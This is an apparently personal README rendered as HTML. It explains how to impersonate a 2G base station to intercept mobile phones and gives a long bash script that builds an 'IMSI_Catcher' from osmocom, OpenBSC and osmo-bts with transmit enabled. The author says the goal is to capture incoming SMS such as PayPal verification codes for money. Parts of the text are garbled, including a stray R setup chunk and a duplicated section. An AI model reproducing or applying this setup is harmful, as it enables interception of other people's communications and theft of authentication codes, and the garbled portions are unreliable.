<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>

<meta charset="utf-8">
<meta name="generator" content="quarto-1.3.450">

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">


<title>Mémoire(s)</title>
<style>
code{white-space: pre-wrap;}
span.smallcaps{font-variant: small-caps;}
div.columns{display: flex; gap: min(4vw, 1.5em);}
div.column{flex: auto; overflow-x: auto;}
div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
ul.task-list{list-style: none;}
ul.task-list li input[type="checkbox"] {
  width: 0.8em;
  margin: 0 0.8em 0.2em -1em; /* quarto-specific, see https://github.com/quarto-dev/quarto-cli/issues/4556 */ 
  vertical-align: middle;
}
/* CSS for syntax highlighting */
pre > code.sourceCode { white-space: pre; position: relative; }
pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
pre > code.sourceCode > span:empty { height: 1.2em; }
.sourceCode { overflow: visible; }
code.sourceCode > span { color: inherit; text-decoration: inherit; }
div.sourceCode { margin: 1em 0; }
pre.sourceCode { margin: 0; }
@media screen {
div.sourceCode { overflow: auto; }
}
@media print {
pre > code.sourceCode { white-space: pre-wrap; }
pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
}
pre.numberSource code
  { counter-reset: source-line 0; }
pre.numberSource code > span
  { position: relative; left: -4em; counter-increment: source-line; }
pre.numberSource code > span > a:first-child::before
  { content: counter(source-line);
    position: relative; left: -1em; text-align: right; vertical-align: baseline;
    border: none; display: inline-block;
    -webkit-touch-callout: none; -webkit-user-select: none;
    -khtml-user-select: none; -moz-user-select: none;
    -ms-user-select: none; user-select: none;
    padding: 0 4px; width: 4em;
  }
pre.numberSource { margin-left: 3em;  padding-left: 4px; }
div.sourceCode
  {   }
@media screen {
pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
}
</style>


<script src="README_files/libs/clipboard/clipboard.min.js"></script>
<script src="README_files/libs/quarto-html/quarto.js"></script>
<script src="README_files/libs/quarto-html/popper.min.js"></script>
<script src="README_files/libs/quarto-html/tippy.umd.min.js"></script>
<script src="README_files/libs/quarto-html/anchor.min.js"></script>
<link href="README_files/libs/quarto-html/tippy.css" rel="stylesheet">
<link href="README_files/libs/quarto-html/quarto-syntax-highlighting.css" rel="stylesheet" id="quarto-text-highlighting-styles">
<script src="README_files/libs/bootstrap/bootstrap.min.js"></script>
<link href="README_files/libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
<link href="README_files/libs/bootstrap/bootstrap.min.css" rel="stylesheet" id="quarto-bootstrap" data-mode="light">


</head>

<body class="fullcontent">

<div id="quarto-content" class="page-columns page-rows-contents page-layout-article">

<main class="content" id="quarto-document-content">

<header id="title-block-header" class="quarto-title-block default">
<div class="quarto-title">
<h1 class="title">Mémoire(s)</h1>
</div>



<div class="quarto-title-meta">

    
  
    
  </div>
  

</header>

<pre><code>1
00:00:57,265 --&gt; 00:00:58,975
- Seq, I'm in.
- Captain.

2
00:00:59,058 --&gt; 00:01:00,310
You were right.

3
00:01:00,393 --&gt; 00:01:01,811
The skylight
was a window pane.

4
00:01:01,895 --&gt; 00:01:03,396
I've got
serious interference.

5
00:01:03,480 --&gt; 00:01:04,814
Weird.
It's some kind of Modal.

6
00:01:04,898 --&gt; 00:01:06,691
Looks like old code.

7
00:01:06,775 --&gt; 00:01:08,151
It feels
really familiar.

8
00:01:08,234 --&gt; 00:01:09,986
Drop a pin.
I'll signal for backup.

9
00:01:10,069 --&gt; 00:01:11,738
- I'm gonna check it out.
- -Bugs?

10
00:01:11,821 --&gt; 00:01:13,031
If the general finds out
we've been fishing...

11
00:01:13,114 --&gt; 00:01:14,783
A quick peek can't hurt.

12
00:01:14,866 --&gt; 00:01:16,159
Did you hear that?

13
00:01:16,242 --&gt; 00:01:17,619
Shit. I think
our signal was traced.

14
00:01:17,702 --&gt; 00:01:19,829
Bugs, this feels like a trap.

15
00:01:19,913 --&gt; 00:01:21,039
Bugs!</code></pre>
<section id="hello-world" class="level1">
<h1>Hello World !</h1>
<p>This is how it begin ? So why telecom ? Cause I have skills with ! Honestly was guided by security and wanted to be independant outside society but we have to live in… So what is to be independant : I think have money sorry if this is materialist but until you prove the opposite we can’t live without… Even commandos in nature have shoes ;) and they have to buy it. So the link between telecommunication and money ? Incomming SMS ! Paypal Verification, etc and I didn’t want to abuse of trust and didn’t want to search the 815e vulnerability in PHP. I wanted an always working hack or almost always working… So what is the way ? SDR : Software Defined Radio like the name says this kind of radios are software defined it means that demodulation is not part of hardware but is made software based. And now what can we do with ? So many things… I will focus on mobile telephony. So let’s go !</p>
<section id="hacking-2g-fooling-ms-mobile-station-the-2g-phone" class="level2">
<h2 class="anchored" data-anchor-id="hacking-2g-fooling-ms-mobile-station-the-2g-phone">Hacking 2G (Fooling MS : Mobile Station, the 2G phone)</h2>
<p>Easy ! The MS doesn’t ask authentication from BTS (Base Transceiver Station, the relay antenna). So what to do to intercept ? Be a BTS… and that’s all just spoof the public values of the BTS (mcc,mnc exemple 208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger signal and it is done. How the implement a 2G BTS ? there are open sourced implementation on github. https://github.com/osmocom (OpenBSC Osmo-Trx Osmo-Bts… EOL but usefull) or (Network in the Box Updated) https://github.com/RangeNetworks/openbts https://github.com/vir/yate</p>
<p>To install it I have scripted it for example for OpenBSC : <code></code>{r setup, include=FALSE, echo=FALSE, warning=FALSE} library(pander) library(knitr) library(memisc) library(stargazer) knitr::opts_chunk$set(echo = TRUE)<br>
.. code-block:: <strong>Radio-Frequencies Protocols :</strong> ———————————</p>
<p>A protocol is for computing (quoted from Oxford langage):<br>
“A set of rules governing the exchange or transmission of data between devices.” <a href="https://www.oed.com/" class="uri">https://www.oed.com/</a>. The goal like it is said is to make travel information from A-&gt;B, and (maybe) then B-&gt;A etcaetera. This information has a weight and it has to move so : energy is spent, at least F(A-&gt;B). Another goals came obviously from the first depending on the case of use : spending the less energy possible, have the maximum range, transmit the most data possible, have the best yield, and be the most secure possible (I mean by that, that it can’t be understood by a machine or an human on an undesired endpoint in a reasonable time at least at the time of conception and from the projected advances in technology), there are also another important points the latency, and the errors between the message sent and received. We will begin by enumerate some radio protocols, begin by saying their purpose. Then we gonna try to classify theses protocols by energy, data (raw and useful payload), power, range, frequencies and yield, security, latency, and error. ————————————–<br>
<strong>List (non-exhaustive) of Protocols</strong> ————————————–</p>
<div class="cell">
<div class="cell-output cell-output-stdout">
<pre><code># A tibble: 22 × 2
   Protocol                Purpose                                      
   &lt;chr&gt;                   &lt;chr&gt;                                        
 1 RFID                    Traceabitlity / Static Information Exchange  
 2 NFC                     Bank Operations / Static Information Exchange
 3 GSM/GPRS*/EDGE*         Calls / SMS / Internet*                      
 4 UMTS/HSPA/HSPA_advanced Calls / SMS / Internet                       
 5 LTE/LTE_Advanced        Calls / SMS / Internet / IoT                 
 6 5G SA/NSA               Calls / SMS / Internet / IoT                 
 7 Wifi                    Internet / LAN / Calls (VoWifi)              
 8 Bluetooth               Data exchange / Pairing devices              
 9 LoRa/SigFox             Data exchange / IoT                          
10 GPS/Galileo             Geolocalization                              
# ℹ 12 more rows</code></pre>
</div>
</div>
<p>newpage</p>
<hr>
</section>
</section>
<section id="radio-telephony" class="level1">
<h1><strong>Radio-Telephony</strong></h1>
<hr>
</section>
<section id="example-of-sfr" class="level1">
<h1><strong>Example of SFR:</strong></h1>
<p><strong>Article 1</strong></p>
<p>– The French Radiotelephone Company ("Société Française de Radiotéléphonie") is authorized to use, in the 900 and 1800 MHz bands, the frequencies allocated to it in Article 2 of this decision to establish and operate a radio network open to the public in metropolitan France. For this, it complies with the provisions of the specifications located in appendix 2 of this decision.</p>
<p><strong>Article 2</strong></p>
<p>– The GSM channels allocated to the French Radiotelephone Company are, in accordance with the definitions in appendix 1:</p>
<ul>
<li>in the 900 MHz band, throughout mainland France: channels 75 to 124;</li>
<li>in the 900 MHz band, only in very dense areas: channels 63 to 74;</li>
<li>in the 1800 MHz band, throughout mainland France: channels 512 to 525 and 647 to 751</li>
</ul>
<p>For others Operator (GSM)</p>
<div class="cell">
<div class="cell-output cell-output-stdout">
<pre><code># A tibble: 3 × 3
  Operator GSM900              DCS1800            
  &lt;chr&gt;    &lt;chr&gt;               &lt;chr&gt;              
1 Orange   1→62                527→645            
2 SFR      (63→74)* and 75→124 512→525 and 647→751
3 Bouygues 975→1023            752→885            </code></pre>
</div>
</div>
<p>Free = ? (Free didn’t invest much in 2G antenna since 2G will die in 2025 in France the use Orange roaming )</p>
<table class="table">
<tbody>
<tr class="odd">
<td><strong>2G Attack :</strong></td>
</tr>
</tbody>
</table>
<section id="hacking-2g" class="level2">
<h2 class="anchored" data-anchor-id="hacking-2g">Hacking 2G</h2>
<p>(Fooling MS : Mobile Station, the 2G phone) The MS doesn’t ask authentication from BTS (Base Transceiver Station, the relay antenna). So what to do to intercept ? Be a BTS… and that’s all just spoof the public values of the BTS (mcc,mnc exemple 208,15 for FreeMobile 208,01 for Orange, etc) and broadcast a stronger signal and it is done. How the implement a 2G BTS ? there are open sourced implementation on github.<br>
https://github.com/osmocom (OpenBSC Osmo-Trx Osmo-Bts… EOL but usefull) or (Network in the Box Updated)<br>
https://github.com/RangeNetworks/openbts https://github.com/vir/yate To install it I have scripted it for example for OpenBSC :</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/bin/bash</span></span>
<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="bu">read</span> <span class="at">-p</span> <span class="st">"Architecture ? amd64, armel, arm64 ?"</span> <span class="va">ARCH</span></span>
<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> apt install autoconf <span class="at">-y</span></span>
<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a><span class="ex">apt-key</span> adv <span class="at">--recv-keys</span> <span class="at">--keyserver</span> keyserver.ubuntu.com 3B4FE6ACC0B21F32 40976EAF437D05B5</span>
<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /etc/apt/trusted.gpg /etc/apt/trusted.gpg.d</span>
<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install gcc-9 g++-9 gcc-10 g++-10 git <span class="at">-y</span></span>
<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"deb [arch=</span><span class="va">$ARCH</span><span class="st">] http://fr.archive.ubuntu.com/ubuntu/ xenial main restricted universe multiverse"</span> <span class="op">&gt;&gt;</span> /etc/apt/sources.list</span>
<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> update</span>
<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install gcc-4.9 g++-4.9 <span class="at">-y</span></span>
<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="st">'$ d'</span> /etc/apt/sources.list</span>
<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> update</span>
<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> build-essential libusb-1.0-0-dev libsqlite3-dev libsctp-dev libgmp-dev libx11-6 libx11-dev flex libncurses5 libdbd-sqlite3 libdbi-dev libncurses5-dev libncursesw5 libpcsclite-dev zlib1g-dev libmpfr4 libmpc3 lemon aptitude libtinfo-dev libtool shtool autoconf git-core pkg-config make libmpfr-dev libmpc-dev libtalloc-dev libfftw3-dev libgnutls28-dev libtool-bin libxml2-dev sofia-sip-bin libsofia-sip-ua-dev sofia-sip-bin libncursesw5-dev bison libgmp3-dev alsa-oss</span>
<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-4.9 49 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-4.9</span>
<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-7 70 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-7</span>
<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-9 90 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-9</span>
<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-10 100 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-10</span>
<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"deb [arch=</span><span class="va">$ARCH</span><span class="st">] http://fr.archive.ubuntu.com/ubuntu/ bionic main restricted universe multiverse"</span> <span class="op">&gt;&gt;</span> /etc/apt/sources.list</span>
<span id="cb4-18"><a href="#cb4-18" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> update</span>
<span id="cb4-19"><a href="#cb4-19" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> gcc-5 g++-5 libssl1.0-dev</span>
<span id="cb4-20"><a href="#cb4-20" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="st">'$ d'</span> /etc/apt/sources.list</span>
<span id="cb4-21"><a href="#cb4-21" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"deb [arch=</span><span class="va">$ARCH</span><span class="st">] http://fr.archive.ubuntu.com/ubuntu/ focal main restricted universe multiverse"</span> <span class="op">&gt;&gt;</span> /etc/apt/sources.list</span>
<span id="cb4-22"><a href="#cb4-22" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> update</span>
<span id="cb4-23"><a href="#cb4-23" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> gcc-7 g++-7</span>
<span id="cb4-24"><a href="#cb4-24" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--install</span> /usr/bin/gcc gcc /usr/bin/gcc-5 50 <span class="at">--slave</span> /usr/bin/g++ g++ /usr/bin/g++-5</span>
<span id="cb4-25"><a href="#cb4-25" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="st">'$ d'</span> /etc/apt/sources.list</span>
<span id="cb4-26"><a href="#cb4-26" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> update</span>
<span id="cb4-27"><a href="#cb4-27" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-4.9</span>
<span id="cb4-28"><a href="#cb4-28" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> remove texinfo</span>
<span id="cb4-29"><a href="#cb4-29" aria-hidden="true" tabindex="-1"></a><span class="fu">mkdir</span> <span class="at">-p</span> /opt/IMSI_Catcher</span>
<span id="cb4-30"><a href="#cb4-30" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-31"><a href="#cb4-31" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> http://ftp.gnu.org/gnu/texinfo/texinfo-4.13.tar.gz</span>
<span id="cb4-32"><a href="#cb4-32" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> xvf texinfo-4.13.tar.gz</span>
<span id="cb4-33"><a href="#cb4-33" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> texinfo-4.13</span>
<span id="cb4-34"><a href="#cb4-34" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-35"><a href="#cb4-35" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-36"><a href="#cb4-36" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-37"><a href="#cb4-37" aria-hidden="true" tabindex="-1"></a><span class="co">#git clone https://github.com/bbaranoff/gnu-arm-installer.git gnuarm</span></span>
<span id="cb4-38"><a href="#cb4-38" aria-hidden="true" tabindex="-1"></a><span class="co">#cd gnuarm</span></span>
<span id="cb4-39"><a href="#cb4-39" aria-hidden="true" tabindex="-1"></a><span class="co">##Run the Scripts</span></span>
<span id="cb4-40"><a href="#cb4-40" aria-hidden="true" tabindex="-1"></a><span class="co">#bash gnu-arm-installer.sh</span></span>
<span id="cb4-41"><a href="#cb4-41" aria-hidden="true" tabindex="-1"></a><span class="co">#export PATH=$PATH:/root/gnuarm/install/bin</span></span>
<span id="cb4-42"><a href="#cb4-42" aria-hidden="true" tabindex="-1"></a><span class="co"># Now you have cross-compiler ready you can build osmocom with your firmware</span></span>
<span id="cb4-43"><a href="#cb4-43" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb4-44"><a href="#cb4-44" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-45"><a href="#cb4-45" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmocore.git</span>
<span id="cb4-46"><a href="#cb4-46" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmocore</span>
<span id="cb4-47"><a href="#cb4-47" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 1.3.0</span>
<span id="cb4-48"><a href="#cb4-48" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-i</span></span>
<span id="cb4-49"><a href="#cb4-49" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-50"><a href="#cb4-50" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-51"><a href="#cb4-51" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-52"><a href="#cb4-52" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-53"><a href="#cb4-53" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-54"><a href="#cb4-54" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone git://git.osmocom.org/libosmo-dsp.git</span>
<span id="cb4-55"><a href="#cb4-55" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> libosmo-dsp</span>
<span id="cb4-56"><a href="#cb4-56" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-i</span></span>
<span id="cb4-57"><a href="#cb4-57" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-58"><a href="#cb4-58" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span></span>
<span id="cb4-59"><a href="#cb4-59" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-60"><a href="#cb4-60" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-61"><a href="#cb4-61" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-5</span>
<span id="cb4-62"><a href="#cb4-62" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmocom-bb trx</span>
<span id="cb4-63"><a href="#cb4-63" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> trx</span>
<span id="cb4-64"><a href="#cb4-64" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout jolly/testing</span>
<span id="cb4-65"><a href="#cb4-65" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> src</span>
<span id="cb4-66"><a href="#cb4-66" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://github.com/bbaranoff/telco_install_sh/raw/main/trx.highram.bin</span>
<span id="cb4-67"><a href="#cb4-67" aria-hidden="true" tabindex="-1"></a><span class="fu">sed</span> <span class="at">-i</span> <span class="at">-e</span>  <span class="st">'s/#CFLAGS += -DCONFIG_TX_ENABLE/CFLAGS += -DCONFIG_TX_ENABLE/g'</span> target/firmware/Makefile</span>
<span id="cb4-68"><a href="#cb4-68" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> HOST_layer23_CONFARGS=--enable-transceiver nofirmware</span>
<span id="cb4-69"><a href="#cb4-69" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-70"><a href="#cb4-70" aria-hidden="true" tabindex="-1"></a><span class="ex">update-alternatives</span> <span class="at">--set</span> gcc /usr/bin/gcc-9</span>
<span id="cb4-71"><a href="#cb4-71" aria-hidden="true" tabindex="-1"></a><span class="ex">apt</span> install <span class="at">-y</span> libortp-dev</span>
<span id="cb4-72"><a href="#cb4-72" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-73"><a href="#cb4-73" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-abis</span>
<span id="cb4-74"><a href="#cb4-74" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/libosmo-abis</span>
<span id="cb4-75"><a href="#cb4-75" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb4-76"><a href="#cb4-76" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--disable-dahdi</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb4-77"><a href="#cb4-77" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-78"><a href="#cb4-78" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-79"><a href="#cb4-79" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/libosmo-netif</span>
<span id="cb4-80"><a href="#cb4-80" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/libosmo-netif</span>
<span id="cb4-81"><a href="#cb4-81" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.7.0</span>
<span id="cb4-82"><a href="#cb4-82" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb4-83"><a href="#cb4-83" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-84"><a href="#cb4-84" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-85"><a href="#cb4-85" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/openbsc</span>
<span id="cb4-86"><a href="#cb4-86" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/openbsc/openbsc</span>
<span id="cb4-87"><a href="#cb4-87" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--with-lms</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb4-88"><a href="#cb4-88" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-89"><a href="#cb4-89" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher</span>
<span id="cb4-90"><a href="#cb4-90" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/osmocom/osmo-bts</span>
<span id="cb4-91"><a href="#cb4-91" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/osmo-bts</span>
<span id="cb4-92"><a href="#cb4-92" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> checkout 0.8.1</span>
<span id="cb4-93"><a href="#cb4-93" aria-hidden="true" tabindex="-1"></a><span class="ex">autoreconf</span> <span class="at">-fi</span> <span class="kw">&amp;&amp;</span> <span class="ex">./configure</span> <span class="at">--enable-trx</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> <span class="at">-j4</span> <span class="kw">&amp;&amp;</span> <span class="fu">make</span> install <span class="kw">&amp;&amp;</span> <span class="ex">ldconfig</span></span>
<span id="cb4-94"><a href="#cb4-94" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb4-95"><a href="#cb4-95" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_catcher</span>
<span id="cb4-96"><a href="#cb4-96" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://github.com/bbaranoff/telco_install_sh/raw/main/opencore-amr-0.1.5.tar.gz</span>
<span id="cb4-97"><a href="#cb4-97" aria-hidden="true" tabindex="-1"></a><span class="fu">tar</span> xvzf opencore-amr-0.1.5.tar.gz</span>
<span id="cb4-98"><a href="#cb4-98" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> opencore-amr-0.1.5</span>
<span id="cb4-99"><a href="#cb4-99" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-100"><a href="#cb4-100" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> <span class="at">-j</span><span class="va">$(</span><span class="fu">nproc</span><span class="va">)</span></span>
<span id="cb4-101"><a href="#cb4-101" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> install</span>
<span id="cb4-102"><a href="#cb4-102" aria-hidden="true" tabindex="-1"></a><span class="ex">ldconfig</span></span>
<span id="cb4-103"><a href="#cb4-103" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/build/certs</span>
<span id="cb4-104"><a href="#cb4-104" aria-hidden="true" tabindex="-1"></a><span class="ex">openssl</span> req <span class="at">-new</span> <span class="at">-x509</span> <span class="at">-newkey</span> rsa:2048 <span class="at">-keyout</span> signing_key.pem <span class="at">-outform</span> DER <span class="at">-out</span> signing_key.x509 <span class="at">-nodes</span> <span class="at">-subj</span> <span class="st">"/CN=Owner/"</span></span>
<span id="cb4-105"><a href="#cb4-105" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/</span>
<span id="cb4-106"><a href="#cb4-106" aria-hidden="true" tabindex="-1"></a><span class="fu">git</span> clone https://github.com/isdn4linux/mISDN</span>
<span id="cb4-107"><a href="#cb4-107" aria-hidden="true" tabindex="-1"></a><span class="bu">cd</span> /opt/IMSI_Catcher/mISDN</span>
<span id="cb4-108"><a href="#cb4-108" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-Rf</span> /lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/kernel/drivers/isdn/hardware/mISDN</span>
<span id="cb4-109"><a href="#cb4-109" aria-hidden="true" tabindex="-1"></a><span class="fu">rm</span> <span class="at">-Rf</span> /lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/kernel/drivers/isdn/mISDN/</span>
<span id="cb4-110"><a href="#cb4-110" aria-hidden="true" tabindex="-1"></a><span class="fu">wget</span> https://raw.githubusercontent.com/bbaranoff/PImpMyPi/main/octvqe.patch</span>
<span id="cb4-111"><a href="#cb4-111" aria-hidden="true" tabindex="-1"></a><span class="fu">cp</span> /boot/System.map-<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span> /usr/src/linux-headers-<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/System.map</span>
<span id="cb4-112"><a href="#cb4-112" aria-hidden="true" tabindex="-1"></a><span class="fu">ln</span> <span class="at">-s</span> /lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/build /lib/modules/<span class="va">$(</span><span class="fu">uname</span> <span class="at">-r</span><span class="va">)</span>/source</span>
<span id="cb4-113"><a href="#cb4-113" aria-hidden="true" tabindex="-1"></a><span class="fu">aclocal</span> <span class="kw">&amp;&amp;</span> <span class="fu">automake</span> <span class="at">--add-missing</span></span>
<span id="cb4-114"><a href="#cb4-114" aria-hidden="true" tabindex="-1"></a><span class="ex">./configure</span></span>
<span id="cb4-115"><a href="#cb4-115" aria-hidden="true" tabindex="-1"></a><span class="fu">patch</span> <span class="at">-p0</span> <span class="op">&lt;</span> octvqe.patch</span>
<span id="cb4-116"><a href="#cb4-116" aria-hidden="true" tabindex="-1"></a><span class="fu">make</span> modules</span>
